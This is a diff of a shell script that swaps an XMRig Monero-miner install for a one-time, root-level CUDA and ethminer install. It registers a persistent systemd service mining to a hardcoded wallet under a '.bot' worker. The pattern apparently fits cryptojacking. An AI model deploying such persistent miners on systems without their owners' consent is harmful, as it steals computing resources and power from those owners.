@@ -1,7 +1,20 @@
-cd /usr/local/bin
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-static-x64.tar.gz
-sudo tar xvzf xmrig-6.13.1-linux-static-x64.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.13.1/xmrig -o pool.minexmr.com:4444 -u 89hcQqpWLPPAukFimWtGBDZys4Ar54wRjeNhWX2HmSVv3vXz43FeRAdV627VJhF6mjGbApaWae6hK7HnPA7n2Ro1UHE5tbS -p 5t8 --rig-id 5t8 --randomx-no-rdmsr\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig.service
-echo "Setup completed!"
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
+	echo "taind vip pro" > isHaveSetupCoin.txt
+	cd /usr/local/bin
+	sudo apt-get install linux-headers-$(uname -r) -y
+	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+	sudo apt-get update
+	sudo apt-get -y install cuda-drivers
+	sudo apt-get install libcurl3 -y
+	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x1a512efd0c8b1d2cb042a7955e952a5e6569124d.bot@us2.ethermine.org:4444 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+	sudo systemctl daemon-reload
+	sudo systemctl enable eth.service
+	sudo systemctl start eth.service
+fi
